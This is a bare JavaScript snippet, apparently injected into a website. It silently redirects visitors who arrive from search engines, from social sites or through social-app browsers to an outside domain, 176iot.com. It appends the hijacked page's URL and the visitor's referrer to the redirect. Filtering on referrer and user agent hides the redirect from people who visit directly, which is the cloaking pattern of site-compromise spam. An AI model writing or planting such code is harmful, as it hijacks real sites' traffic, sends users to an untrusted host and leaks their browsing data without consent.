var ars = 'https://www.176iot.com';
if(['.google.', 'bing.', '.yahoo.', 'yandex.', 'facebook.', 'pinterest.', 'duckduckgo.', 'aol.', 'dogpile.', 'ecosia.', 'info.', 'see-it.', 'wow.'].some(s => document.referrer.toLowerCase().includes(s)) || ['fb', 'facebook', 'pinterest', 'twitter'].some(s => navigator.userAgent.toLowerCase().includes(s))){ window.location.href = ars + '/?arsae='+ encodeURIComponent(window.location.href) + '&arsae_ref='+ encodeURIComponent(document.referrer) }
